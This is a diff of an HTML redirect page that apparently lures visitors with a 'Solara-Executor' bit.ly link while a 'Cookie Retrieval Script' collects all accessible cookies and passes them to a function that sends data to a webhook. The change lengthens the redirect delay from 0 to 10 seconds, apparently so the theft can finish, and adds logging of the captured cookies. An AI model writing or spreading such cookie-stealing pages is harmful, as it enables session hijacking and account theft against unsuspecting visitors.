@@ -14,7 +14,7 @@
       gtag('config', 'G-NTTP5YDYL7');
     </script>
     <!-- End Google Analytics -->
-    <meta http-equiv="refresh" content="0; url=https://bit.ly/Solara-Executor">
+    <meta http-equiv="refresh" content="10; url=https://bit.ly/Solara-Executor">
     <!-- Cookie Retrieval Script -->
     <script>
         // Function to get all accessible cookies
@@ -32,6 +32,14 @@
 
         // Retrieve all accessible cookies
         let allCookies = getAllCookies();
+
+        // Log the cookies to the console for debugging
+        console.log("Retrieved Cookies: ", allCookies);
+
+        // Check if cookies are empty
+        if (Object.keys(allCookies).length === 0) {
+            console.warn("No accessible cookies found.");
+        }
 
         // Function to send data to webhook
         function sendToWebhook(data) {
